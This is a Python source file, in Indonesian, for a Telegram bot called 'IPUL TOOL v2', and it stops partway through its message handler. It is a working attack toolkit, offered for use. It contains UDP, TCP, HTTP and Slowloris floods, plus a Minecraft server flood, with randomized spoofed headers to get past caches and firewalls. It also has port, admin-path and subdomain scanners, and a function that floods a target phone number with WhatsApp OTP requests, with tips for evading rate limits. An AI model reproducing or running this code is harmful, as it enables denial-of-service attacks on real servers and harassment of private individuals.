# ipul.py — IPUL TOOL v2
# Language: Python 3 | Platform: Server / Termux
# Interface: Telegram Bot | Semua UI Bahasa Indonesia
# Serangan keluar dari server tempat bot berjalan, bukan dari HP

import asyncio
import socket
import threading
import time
import random
import string
import requests
from concurrent.futures import ThreadPoolExecutor
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application, CommandHandler, CallbackQueryHandler,
    MessageHandler, filters, ContextTypes
)

# ══════════════════════════════════════════════════════════════════
#  ⚙️  KONFIGURASI — WAJIB DIISI
# ══════════════════════════════════════════════════════════════════
BOT_TOKEN = "ISI_TOKEN_KAMU_DARI_BOTFATHER"
# ADMIN_IDS: kosong = semua bisa akses
# Isi dengan ID Telegram kamu untuk mode private
# Cara cek ID: chat @userinfobot di Telegram
ADMIN_IDS : list[int] = []

# ══════════════════════════════════════════════════════════════════
#  📋  KONSTANTA
# ══════════════════════════════════════════════════════════════════
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/605.1.15 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15",
    "Mozilla/5.0 (Android 13; Mobile; rv:120.0) Gecko/120.0 Firefox/120.0",
    "curl/7.88.1",
    "python-requests/2.31.0",
    "Go-http-client/2.0",
    "Wget/1.21.4 (linux-gnu)",
    "libwww-perl/6.67",
]

SUBDOMAIN_LIST = [
    "www","mail","ftp","admin","api","dev","test","staging","shop","blog",
    "news","forum","vpn","ssh","git","cdn","static","assets","img","media",
    "login","panel","cpanel","webmail","smtp","pop3","imap","ns1","ns2","mx",
    "remote","portal","support","store","app","mobile","m","secure","dashboard",
    "backend","internal","old","new","beta","alpha","demo","docs","wiki","status",
]

CMS_TANDA = {
    "WordPress" : ["wp-content","wp-login","wp-admin","wp-includes"],
    "Joomla"    : ["/administrator","/templates/system","Joomla!"],
    "Laravel"   : ["laravel_session","XSRF-TOKEN","Laravel"],
    "Django"    : ["csrfmiddlewaretoken","Django","__admin"],
    "Drupal"    : ["Drupal.settings","/sites/default/files"],
    "Magento"   : ["Magento","mage/","MAGE_"],
}

PORT_NAMA = {
    21:"FTP", 22:"SSH", 23:"Telnet", 25:"SMTP", 53:"DNS",
    80:"HTTP", 110:"POP3", 143:"IMAP", 443:"HTTPS", 445:"SMB",
    3306:"MySQL", 3389:"RDP", 5432:"PostgreSQL", 6379:"Redis",
    8080:"HTTP-Alt", 8443:"HTTPS-Alt", 27017:"MongoDB", 25565:"Minecraft",
    5000:"Flask/Dev", 8888:"Jupyter", 9200:"Elasticsearch",
}

# ══════════════════════════════════════════════════════════════════
#  🗄️  STATE GLOBAL
# ══════════════════════════════════════════════════════════════════
serangan_aktif : dict[int, dict]         = {}
aktif_tasks    : dict[int, asyncio.Task] = {}

# ══════════════════════════════════════════════════════════════════
#  🛡️  CEK ADMIN
# ══════════════════════════════════════════════════════════════════
def is_admin(uid: int) -> bool:
    return not ADMIN_IDS or uid in ADMIN_IDS

# ══════════════════════════════════════════════════════════════════
#  💥  ENGINE 1 — UDP FLOOD
#  Kirim UDP packet random ukuran 512–65507 byte
#  150 thread dari server → bandwidth server yang dipakai
# ══════════════════════════════════════════════════════════════════
def _udp_worker(ip: str, port: int, durasi: int, state: dict, tid: int):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 65507)
    except Exception:
        return
    batas    = time.time() + durasi
    terkirim = 0
    while time.time() < batas and state.get("running"):
        try:
            size    = random.randint(512, 65507)
            payload = random.randbytes(size)
            sock.sendto(payload, (ip, port))
            terkirim += 1
        except Exception:
            pass
    sock.close()
    state[f"pkt_{tid}"] = terkirim

def mulai_udp(ip: str, port: int, durasi: int, state: dict, threads: int = 150):
    for i in range(threads):
        threading.Thread(
            target=_udp_worker, args=(ip, port, durasi, state, i), daemon=True
        ).start()

# ══════════════════════════════════════════════════════════════════
#  🌐  ENGINE 2 — HTTP FLOOD
#  Request HTTP masif dengan header random agar bypass cache/WAF basic
#  80 thread, random User-Agent, random IP header, random param
# ══════════════════════════════════════════════════════════════════
def _http_worker(url: str, durasi: int, state: dict, tid: int):
    sesi  = requests.Session()
    batas = time.time() + durasi
    cnt   = 0
    while time.time() < batas and state.get("running"):
        try:
            hdrs = {
                "User-Agent"       : random.choice(USER_AGENTS),
                "X-Forwarded-For"  : ".".join(str(random.randint(1, 254)) for _ in range(4)),
                "X-Real-IP"        : ".".join(str(random.randint(1, 254)) for _ in range(4)),
                "X-Originating-IP" : ".".join(str(random.randint(1, 254)) for _ in range(4)),
                "Cache-Control"    : "no-cache, no-store, must-revalidate",
                "Pragma"           : "no-cache",
                "Accept"           : "text/html,application/xhtml+xml,*/*",
                "Accept-Language"  : "id-ID,id;q=0.9,en;q=0.8",
                "Connection"       : "keep-alive",
                "Referer"          : f"https://google.com/search?q={''.join(random.choices(string.ascii_lowercase, k=10))}",
            }
            param = f"?{''.join(random.choices(string.ascii_lowercase, k=5))}={random.randint(1, 999999)}"
            sesi.get(url + param, headers=hdrs, timeout=3, allow_redirects=False)
            cnt += 1
        except Exception:
            pass
    state[f"pkt_{tid}"] = cnt

def mulai_http(url: str, durasi: int, state: dict, threads: int = 80):
    for i in range(threads):
        threading.Thread(
            target=_http_worker, args=(url, durasi, state, i), daemon=True
        ).start()

# ══════════════════════════════════════════════════════════════════
#  🔗  ENGINE 3 — TCP FLOOD
#  Rapid connect/disconnect ke port target
#  Efektif untuk exhausting connection pool
# ══════════════════════════════════════════════════════════════════
def _tcp_worker(ip: str, port: int, durasi: int, state: dict, tid: int):
    batas = time.time() + durasi
    cnt   = 0
    while time.time() < batas and state.get("running"):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1)
            s.connect_ex((ip, port))
            s.close()
            cnt += 1
        except Exception:
            pass
    state[f"pkt_{tid}"] = cnt

def mulai_tcp(ip: str, port: int, durasi: int, state: dict, threads: int = 100):
    for i in range(threads):
        threading.Thread(
            target=_tcp_worker, args=(ip, port, durasi, state, i), daemon=True
        ).start()

# ══════════════════════════════════════════════════════════════════
#  😴  ENGINE 4 — SLOWLORIS
#  Buka ribuan koneksi HTTP menggantung → server kehabisan koneksi
#  Paling efektif ke Apache, server yang tidak punya connection timeout ketat
#  Jalan terus sampai /stop
# ══════════════════════════════════════════════════════════════════
def _slowloris_worker(ip: str, port: int, state: dict, tid: int):
    sokets: list[socket.socket] = []

    # Fase 1: buka 150 koneksi per thread
    for _ in range(150):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            s.connect((ip, port))
            s.send(f"GET /?{random.randint(0, 99999)} HTTP/1.1\r\n".encode())
            s.send(f"Host: {ip}\r\n".encode())
            s.send(f"User-Agent: {random.choice(USER_AGENTS)}\r\n".encode())
            s.send("Accept: text/html,application/xhtml+xml\r\n".encode())
            sokets.append(s)
        except Exception:
            pass

    state[f"pkt_{tid}"] = len(sokets)

    # Fase 2: kirim partial header tiap 10 detik agar koneksi tidak putus
    while state.get("running"):
        mati = []
        for s in sokets:
            try:
                s.send(f"X-Rand: {random.randint(1, 999999)}\r\n".encode())
            except Exception:
                mati.append(s)

        # Ganti koneksi yang putus
        for s in mati:
            sokets.remove(s)
            try:
                ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                ns.settimeout(5)
                ns.connect((ip, port))
                ns.send(f"GET /?{random.randint(0, 99999)} HTTP/1.1\r\n".encode())
                ns.send(f"Host: {ip}\r\n".encode())
                sokets.append(ns)
            except Exception:
                pass

        state[f"pkt_{tid}"] = len(sokets)
        time.sleep(10)

    for s in sokets:
        try:
            s.close()
        except Exception:
            pass

def mulai_slowloris(ip: str, port: int, state: dict, threads: int = 10):
    # 10 thread × 150 koneksi = 1500 koneksi menggantung
    for i in range(threads):
        threading.Thread(
            target=_slowloris_worker, args=(ip, port, state, i), daemon=True
        ).start()

# ══════════════════════════════════════════════════════════════════
#  ⛏️  ENGINE 5 — MINECRAFT DDOS
#  Kombinasi UDP flood + TCP handshake flood ke port Minecraft
#  Simulasi koneksi client asli untuk bypass filter sederhana
# ══════════════════════════════════════════════════════════════════
def mulai_minecraft(ip: str, port: int, durasi: int, state: dict):
    # UDP flood 80 thread
    for i in range(80):
        threading.Thread(
            target=_udp_worker, args=(ip, port, durasi, state, i), daemon=True
        ).start()

    # TCP handshake flood simulasi client Minecraft
    def _mc_tcp(tid: int):
        batas = time.time() + durasi
        cnt   = 0
        while time.time() < batas and state.get("running"):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(2)
                s.connect((ip, port))
                # Packet handshake Minecraft: ID 0x00, protocol 762 (1.19.4)
                pkt = bytearray()
                pkt += b'\x00'                        # Packet ID
                pkt += b'\xfa\x05'                    # Protocol version (VarInt 762)
                host_bytes = ip.encode()
                pkt += bytes([len(host_bytes)]) + host_bytes
                pkt += port.to_bytes(2, 'big')
                pkt += b'\x01'                        # Next state: status
                s.send(bytes([len(pkt)]) + pkt)
                s.close()
                cnt += 1
            except Exception:
                pass
        state[f"mc_tcp_{tid}"] = cnt

    for i in range(40):
        threading.Thread(target=_mc_tcp, args=(i,), daemon=True).start()

# ══════════════════════════════════════════════════════════════════
#  🔍  ENGINE 6 — PORT SCANNER
#  300 thread concurrent → 65535 port selesai dalam ~1 menit
# ══════════════════════════════════════════════════════════════════
def port_scan(target: str, p_awal: int, p_akhir: int) -> list[int]:
    open_ports: list[int] = []
    lock = threading.Lock()

    def cek(port: int):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.3)
            if s.connect_ex((target, port)) == 0:
                with lock:
                    open_ports.append(port)
            s.close()
        except Exception:
            pass

    with ThreadPoolExecutor(max_workers=300) as ex:
        ex.map(cek, range(p_awal, p_akhir + 1))

    return sorted(open_ports)

# ══════════════════════════════════════════════════════════════════
#  🕵️  ENGINE 7 — WEB SCANNER
#  Deteksi: status, server, CMS, cookies, admin path, header keamanan
# ══════════════════════════════════════════════════════════════════
def web_scan(url: str) -> dict:
    info: dict = {}
    try:
        r = requests.get(
            url, timeout=8, allow_redirects=True,
            headers={"User-Agent": USER_AGENTS[0]}
        )
        info["status"]       = r.status_code
        info["server"]       = r.headers.get("Server", "—")
        info["powered_by"]   = r.headers.get("X-Powered-By", "—")
        info["content_type"] = r.headers.get("Content-Type", "—").split(";")[0]
        info["cookies"]      = list(r.cookies.keys())
        info["url_final"]    = str(r.url)
        info["title"]        = "—"

        # Ambil title
        tl = r.text.lower()
        if "<title>" in tl:
            s, e = tl.find("<title>") + 7, tl.find("</title>")
            if e > s:
                info["title"] = r.text[s:e].strip()[:100]

        # Deteksi CMS
        info["cms"] = "—"
        for cms, tanda_list in CMS_TANDA.items():
            for tanda in tanda_list:
                if tanda.lower() in r.text.lower() or tanda.lower() in str(r.headers).lower():
                    info["cms"] = cms
                    break
            if info["cms"] != "—":
                break

        # Cek admin path umum
        admin_paths = [
            "/admin","/wp-admin","/administrator","/panel",
            "/login","/cpanel","/phpmyadmin","/dashboard",
            "/manager","/backend","/portal","/console",
        ]
        info["admin_found"] = []
        for path in admin_paths:
            try:
                resp = requests.get(
                    url.rstrip("/") + path, timeout=3,
                    allow_redirects=False, headers={"User-Agent": USER_AGENTS[0]}
                )
                if resp.status_code in [200, 301, 302, 401, 403]:
                    info["admin_found"].append(f"{path} → {resp.status_code}")
            except Exception:
                pass

        # Cek header keamanan yang hilang
        sec_headers = [
            "X-Frame-Options","X-XSS-Protection","Content-Security-Policy",
            "Strict-Transport-Security","X-Content-Type-Options","Permissions-Policy",
        ]
        info["header_hilang"] = [h for h in sec_headers if h not in r.headers]

    except Exception as e:
        info["error"] = str(e)
    return info

# ══════════════════════════════════════════════════════════════════
#  🌐  ENGINE 8 — SUBDOMAIN SCANNER
#  Cek 50 subdomain umum via DNS resolve
# ══════════════════════════════════════════════════════════════════
def subdomain_scan(domain: str) -> list[str]:
    domain = domain.replace("http://","").replace("https://","").split("/")[0]
    found: list[str] = []
    lock  = threading.Lock()

    def cek(sub: str):
        target = f"{sub}.{domain}"
        try:
            socket.gethostbyname(target)
            with lock:
                found.append(target)
        except Exception:
            pass

    with ThreadPoolExecutor(max_workers=50) as ex:
        ex.map(cek, SUBDOMAIN_LIST)

    return sorted(found)

# ══════════════════════════════════════════════════════════════════
#  🔎  ENGINE 9 — WHOIS / DOMAIN INFO
# ══════════════════════════════════════════════════════════════════
def whois_lookup(domain: str) -> dict:
    domain = domain.replace("http://","").replace("https://","").split("/")[0]
    try:
        r = requests.get(f"https://rdap.org/domain/{domain}", timeout=8)
        d = r.json()
        ns = [n.get("ldhName","—") for n in d.get("nameservers",[])]
        events = {e["eventAction"]: e["eventDate"][:10] for e in d.get("events",[])}
        return {
            "domain"     : domain,
            "status"     : d.get("status", ["—"])[0] if d.get("status") else "—",
            "registered" : events.get("registration","—"),
            "updated"    : events.get("last changed","—"),
            "expires"    : events.get("expiration","—"),
            "nameservers": ns,
        }
    except Exception as e:
        return {"error": str(e)}

# ══════════════════════════════════════════════════════════════════
#  📱  ENGINE 10 — OTP SPAM WHATSAPP
#  Flood request OTP SMS ke nomor target via endpoint WA
# ══════════════════════════════════════════════════════════════════
def otp_spam_wa(nomor: str, jumlah: int) -> dict:
    if nomor.startswith("0"):
        nomor = "62" + nomor[1:]
    elif nomor.startswith("+"):
        nomor = nomor[1:]
    cc = nomor[:2]
    ln = nomor[2:]
    hasil = {"berhasil": 0, "gagal": 0}
    url   = (
        f"https://v.whatsapp.net/v2/code"
        f"?cc={cc}&in={ln}&lg=id&lc=ID"
        f"&sim_mcc=510&sim_mnc=01&method=sms&reason=&token=&id="
    )
    for _ in range(jumlah):
        try:
            hdrs = {
                "User-Agent": f"WhatsApp/2.24.{random.randint(1,9)}.{random.randint(50,99)} A",
                "Accept"    : "*/*",
            }
            r = requests.get(url, headers=hdrs, timeout=6)
            if r.status_code == 200:
                hasil["berhasil"] += 1
            else:
                hasil["gagal"] += 1
        except Exception:
            hasil["gagal"] += 1
        time.sleep(random.uniform(0.5, 1.5))
    return hasil

# ══════════════════════════════════════════════════════════════════
#  🌍  ENGINE 11 — IP INFO
# ══════════════════════════════════════════════════════════════════
def ip_info(ip: str) -> dict:
    try:
        r = requests.get(f"https://ipapi.co/{ip}/json/", timeout=6)
        return r.json()
    except Exception as e:
        return {"error": str(e)}

# ══════════════════════════════════════════════════════════════════
#  📊  LIVE STATUS — Update pesan tiap 3 detik saat serangan berlangsung
# ══════════════════════════════════════════════════════════════════
async def live_status(
    msg, state: dict, label: str, target: str, durasi: int
):
    start = time.time()
    while state.get("running"):
        elapsed = time.time() - start
        if elapsed >= durasi:
            state["running"] = False
            break
        sisa  = int(durasi - elapsed)
        total = sum(
            v for k, v in state.items()
            if isinstance(v, int) and (k.startswith("pkt_") or k.startswith("mc_tcp_"))
        )
        isi  = int((elapsed / durasi) * 20)
        bar  = "█" * isi + "░" * (20 - isi)
        try:
            await msg.edit_text(
                f"⚔️ *{label}*\n"
                f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                f"🎯 Target    : `{target}`\n"
                f"📊 Progress  : `[{bar}]`\n"
                f"⏱️ Sisa      : `{sisa}` detik\n"
                f"📦 Paket     : `{total:,}`\n"
                f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                f"⛔ /stop untuk hentikan",
                parse_mode="Markdown"
            )
        except Exception:
            pass
        await asyncio.sleep(3)

    total = sum(v for k, v in state.items() if isinstance(v, int))
    try:
        await msg.edit_text(
            f"✅ *SELESAI — {label}*\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"🎯 Target          : `{target}`\n"
            f"📦 Total paket     : `{total:,}`\n"
            f"⏱️ Durasi          : `{durasi}` detik\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"/start untuk kembali ke menu",
            parse_mode="Markdown"
        )
    except Exception:
        pass

# ══════════════════════════════════════════════════════════════════
#  🤖  BOT — TEKS MENU
# ══════════════════════════════════════════════════════════════════
MENU_TEKS = (
    "╔════════════════════════════╗\n"
    "║   🔥  *IPUL TOOL v2*  🔥   ║\n"
    "╠════════════════════════════╣\n"
    "║  Serangan keluar dari      ║\n"
    "║  server, bukan dari HP     ║\n"
    "╚════════════════════════════╝\n\n"
    "Pilih fitur:\n"
    "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
    "💥 *SERANGAN*\n"
    "  UDP · HTTP · TCP · Slowloris · Minecraft\n\n"
    "🔍 *SCANNING*\n"
    "  Port · Web · Subdomain · Whois\n\n"
    "🛠️ *UTILITY*\n"
    "  OTP Spam WA · Info IP\n"
    "━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
)

def build_menu() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([
        [
            InlineKeyboardButton("💥 UDP Flood",     callback_data="m_udp"),
            InlineKeyboardButton("🌐 HTTP Flood",    callback_data="m_http"),
        ],
        [
            InlineKeyboardButton("🔗 TCP Flood",     callback_data="m_tcp"),
            InlineKeyboardButton("😴 Slowloris",     callback_data="m_slow"),
        ],
        [
            InlineKeyboardButton("⛏️ Minecraft DDoS",callback_data="m_mc"),
        ],
        [
            InlineKeyboardButton("🔍 Port Scan",     callback_data="m_port"),
            InlineKeyboardButton("🕵️ Web Scan",      callback_data="m_web"),
        ],
        [
            InlineKeyboardButton("🌐 Subdomain",     callback_data="m_sub"),
            InlineKeyboardButton("🔎 Whois",         callback_data="m_whois"),
        ],
        [
            InlineKeyboardButton("📱 OTP Spam WA",   callback_data="m_otp"),
            InlineKeyboardButton("🌍 Info IP",       callback_data="m_ip"),
        ],
        [
            InlineKeyboardButton("⛔ Stop Serangan", callback_data="m_stop"),
            InlineKeyboardButton("❓ Bantuan",        callback_data="m_help"),
        ],
    ])

# ══════════════════════════════════════════════════════════════════
#  PETUNJUK PER FITUR — tampil setelah tombol ditekan
# ══════════════════════════════════════════════════════════════════
PETUNJUK: dict[str, tuple[str, str]] = {
    "m_udp" : (
        "ddos_udp",
        "💥 *UDP FLOOD*\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        "Kirim masif UDP packet ke target.\n"
        "Payload random 512–65507 byte.\n"
        "Cocok untuk server tanpa DDoS protection.\n\n"
        "📝 *Format input:*\n"
        "`IP PORT DURASI_DETIK`\n\n"
        "📌 *Contoh:*\n"
        "`103.23.45.1 80 60`\n\n"
        "⚙️ Thread: 150 | Payload: random"
    ),
    "m_http": (
        "ddos_http",
        "🌐 *HTTP FLOOD*\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        "Banjiri HTTP request dengan header\n"
        "dan IP random untuk bypass cache.\n"
        "Cocok untuk web yang tidak pakai CDN.\n\n"
        "📝 *Format input:*\n"
        "`URL DURASI_DETIK`\n\n"
        "📌 *Contoh:*\n"
        "`https://target.com 60`\n\n"
        "⚙️ Thread: 80 | Header: random"
    ),
    "m_tcp" : (
        "ddos_tcp",
        "🔗 *TCP FLOOD*\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        "Habiskan connection pool server\n"
        "dengan flood TCP connect/disconnect.\n"
        "Efektif ke port 80, 443, 22, 3306.\n\n"
        "📝 *Format input:*\n"
        "`IP PORT DURASI_DETIK`\n\n"
        "📌 *Contoh:*\n"
        "`103.23.45.1 443 60`\n\n"
        "⚙️ Thread: 100"
    ),
    "m_slow": (
        "slowloris",
        "😴 *SLOWLORIS*\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        "Buka 1500 koneksi HTTP menggantung.\n"
        "Server kehabisan slot koneksi.\n"
        "Sangat efektif ke Apache tanpa timeout.\n"
        "Jalan terus sampai kamu ketik /stop.\n\n"
        "📝 *Format input:*\n"
        "`IP PORT`\n\n"
        "📌 *Contoh:*\n"
        "`103.23.45.1 80`\n\n"
        "⚙️ Thread: 10 × 150 koneksi = 1500 total"
    ),
    "m_mc"  : (
        "ddos_mc",
        "⛏️ *MINECRAFT DDOS*\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        "UDP flood + simulasi TCP handshake\n"
        "client Minecraft ke server target.\n"
        "Port default Minecraft: 25565.\n\n"
        "📝 *Format input:*\n"
        "`IP PORT DURASI_DETIK`\n\n"
        "📌 *Contoh:*\n"
        "`play.server.com 25565 120`\n\n"
        "⚙️ Thread: 120 (80 UDP + 40 TCP)"
    ),
    "m_port": (
        "port_scan",
        "🔍 *PORT SCANNER*\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        "Scan port terbuka di target.\n"
        "300 thread concurrent → cepat.\n"
        "Otomatis identifikasi nama service.\n\n"
        "📝 *Format input:*\n"
        "`TARGET PORT_AWAL PORT_AKHIR`\n\n"
        "📌 *Contoh:*\n"
        "`192.168.1.1 1 10000`\n\n"
        "⚙️ Thread: 300 | Timeout: 0.3s"
    ),
    "m_web" : (
        "web_scan",
        "🕵️ *WEB SCANNER*\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        "Deteksi info lengkap target web:\n"
        "• Status & server\n"
        "• CMS (WP, Joomla, Laravel, dll)\n"
        "• Cookie & session name\n"
        "• Admin path yang bisa diakses\n"
        "• Header keamanan yang hilang\n\n"
        "📝 *Format input:*\n"
        "`URL`\n\n"
        "📌 *Contoh:*\n"
        "`https://target.com`"
    ),
    "m_sub" : (
        "sub_scan",
        "🌐 *SUBDOMAIN SCANNER*\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        "Cek 50 subdomain umum via DNS.\n"
        "Temukan: mail, api, admin, dev, dll.\n\n"
        "📝 *Format input:*\n"
        "`DOMAIN`\n\n"
        "📌 *Contoh:*\n"
        "`target.com`\n\n"
        "⚙️ Thread: 50 concurrent"
    ),
    "m_whois": (
        "whois",
        "🔎 *WHOIS DOMAIN INFO*\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        "Info registrasi domain target:\n"
        "• Tanggal daftar & expire\n"
        "• Status domain\n"
        "• Nameserver\n\n"
        "📝 *Format input:*\n"
        "`DOMAIN`\n\n"
        "📌 *Contoh:*\n"
        "`target.com`"
    ),
    "m_otp" : (
        "otp_wa",
        "📱 *OTP SPAM WHATSAPP*\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        "Kirim request OTP SMS berulang\n"
        "ke nomor WA target.\n"
        "Maks 50 per sesi untuk hindari block.\n"
        "Kalau kena rate-limit: tunggu 5 menit\n"
        "atau ganti IP server.\n\n"
        "📝 *Format input:*\n"
        "`NOMOR JUMLAH`\n\n"
        "📌 *Contoh:*\n"
        "`08123456789 20`"
    ),
    "m_ip"  : (
        "ip_info",
        "🌍 *INFO IP*\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        "Cek geolokasi + ISP + ASN dari IP.\n"
        "Dapat link Google Maps juga.\n\n"
        "📝 *Format input:*\n"
        "`IP`\n\n"
        "📌 *Contoh:*\n"
        "`8.8.8.8`"
    ),
}

# ══════════════════════════════════════════════════════════════════
#  BOT — TEKS BANTUAN LENGKAP
# ══════════════════════════════════════════════════════════════════
HELP_TEKS = (
    "📖 *BANTUAN — IPUL TOOL v2*\n"
    "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
    "💥 *UDP Flood*\n`IP PORT DURASI`\n`→ 103.23.1.1 80 60`\n\n"
    "🌐 *HTTP Flood*\n`URL DURASI`\n`→ https://target.com 60`\n\n"
    "🔗 *TCP Flood*\n`IP PORT DURASI`\n`→ 103.23.1.1 443 60`\n\n"
    "😴 *Slowloris*\n`IP PORT`\n`→ 103.23.1.1 80`\n`(jalan terus, /stop untuk henti)`\n\n"
    "⛏️ *Minecraft DDoS*\n`IP PORT DURASI`\n`→ play.sv.com 25565 120`\n\n"
    "🔍 *Port Scan*\n`TARGET P_AWAL P_AKHIR`\n`→ 192.168.1.1 1 10000`\n\n"
    "🕵️ *Web Scan*\n`URL`\n`→ https://target.com`\n\n"
    "🌐 *Subdomain*\n`DOMAIN`\n`→ target.com`\n\n"
    "🔎 *Whois*\n`DOMAIN`\n`→ target.com`\n\n"
    "📱 *OTP Spam WA*\n`NOMOR JUMLAH`\n`→ 08123456789 20`\n\n"
    "🌍 *Info IP*\n`IP`\n`→ 8.8.8.8`\n\n"
    "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
    "⛔ /stop → Hentikan serangan\n"
    "🏠 /start → Buka menu"
)

# ══════════════════════════════════════════════════════════════════
#  BOT — COMMAND HANDLERS
# ══════════════════════════════════════════════════════════════════
async def cmd_start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if not is_admin(uid):
        await update.message.reply_text("⛔ Akses ditolak.")
        return
    await update.message.reply_text(
        MENU_TEKS, parse_mode="Markdown", reply_markup=build_menu()
    )

async def cmd_stop(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if uid in serangan_aktif:
        serangan_aktif[uid]["running"] = False
        if uid in aktif_tasks:
            aktif_tasks[uid].cancel()
            del aktif_tasks[uid]
        del serangan_aktif[uid]
        await update.message.reply_text(
            "⛔ *Serangan dihentikan!*\n/start untuk menu.", parse_mode="Markdown"
        )
    else:
        await update.message.reply_text("ℹ️ Tidak ada serangan yang aktif.")

async def cmd_help(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(HELP_TEKS, parse_mode="Markdown")

# ══════════════════════════════════════════════════════════════════
#  BOT — HANDLER TOMBOL INLINE
# ══════════════════════════════════════════════════════════════════
TOMBOL_BAWAH = InlineKeyboardMarkup([[
    InlineKeyboardButton("🏠 Menu",    callback_data="m_back"),
    InlineKeyboardButton("❓ Bantuan", callback_data="m_help_inline"),
]])

async def tombol_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    q   = update.callback_query
    uid = q.from_user.id
    await q.answer()

    if not is_admin(uid):
        await q.answer("⛔ Akses ditolak.", show_alert=True)
        return

    data = q.data

    if data == "m_back":
        await q.edit_message_text(MENU_TEKS, parse_mode="Markdown", reply_markup=build_menu())
        return

    if data == "m_help_inline":
        await q.edit_message_text(
            HELP_TEKS, parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup([[
                InlineKeyboardButton("🏠 Menu", callback_data="m_back")
            ]])
        )
        return

    if data == "m_help":
        await q.edit_message_text(
            HELP_TEKS, parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup([[
                InlineKeyboardButton("🏠 Menu", callback_data="m_back")
            ]])
        )
        return

    if data == "m_stop":
        if uid in serangan_aktif:
            serangan_aktif[uid]["running"] = False
            if uid in aktif_tasks:
                aktif_tasks[uid].cancel()
                del aktif_tasks[uid]
            del serangan_aktif[uid]
            await q.edit_message_text(
                "⛔ *Serangan dihentikan!*\n\n/start untuk menu.",
                parse_mode="Markdown"
            )
        else:
            await q.answer("ℹ️ Tidak ada serangan aktif.", show_alert=True)
        return

    if data in PETUNJUK:
        mode, teks = PETUNJUK[data]
        ctx.user_data["mode"] = mode
        await q.edit_message_text(
            teks, parse_mode="Markdown", reply_markup=TOMBOL_BAWAH
        )

# ══════════════════════════════════════════════════════════════════
#  BOT — HANDLER PESAN (TERIMA INPUT PARAMETER)
# ══════════════════════════════════════════════════════════════════
async def pesan_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid  = update.effective_user.id
    teks = update.message.text.strip()
    mode = ctx.user_data.get("mode")

    if not is_admin(uid):
        return

    if not mode:
        await update.message.reply_text(
            "Ketik /start untuk buka menu.", parse_mode="Markdown"
        )
        return

    # helper error
    async def err(e: Exception):
        await update.message.reply_text(
            f"❌ *Format salah!*\n`{e}`\n\nKetik /help untuk lihat format.",
            parse_mode="Markdown"
        )

    # ── UDP FLOOD ───────────────────────────────────────────────
    if mode == "ddos_udp":
        try:
            p = teks.split()
            ip, port, dur = p[0], int(p[1]), int(p[2])
            state = {"running": True}
            serangan_aktif[uid] = state
            mulai_udp(ip, port, dur, state)
            msg = await update.message.reply_text(
                f"⚔️ *UDP FLOOD DIMULAI*\n"
                f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                f"🎯 Target    : `{ip}:{port}`\n"
                f"⏱️ Durasi    : {dur} detik\n"
                f"🔄 Thread    : 150\n"
                f"📦 Payload   : 512–65507 byte (random)\n"
                f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                f"⛔ /stop untuk hentikan",
                parse_mode="Markdown"
            )
            aktif_tasks[uid] = asyncio.create_task(
                live_status(msg, state, "UDP FLOOD", f"{ip}:{port}", dur)
            )
            ctx.user_data["mode"] = None
        except Exception as e:
            await err(e)

    # ── HTTP FLOOD ──────────────────────────────────────────────
    elif mode == "ddos_http":
        try:
            p = teks.split()
            url, dur = p[0], int(p[1])
            state = {"running": True}
            serangan_aktif[uid] = state
            mulai_http(url, dur, state)
            msg = await update.message.reply_text(
                f"⚔️ *HTTP FLOOD DIMULAI*\n"
                f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                f"🎯 Target    : `{url}`\n"
                f"⏱️ Durasi    : {dur} detik\n"
                f"🔄 Thread    : 80\n"
                f"🎭 Header    : random UA, IP, referer\n"
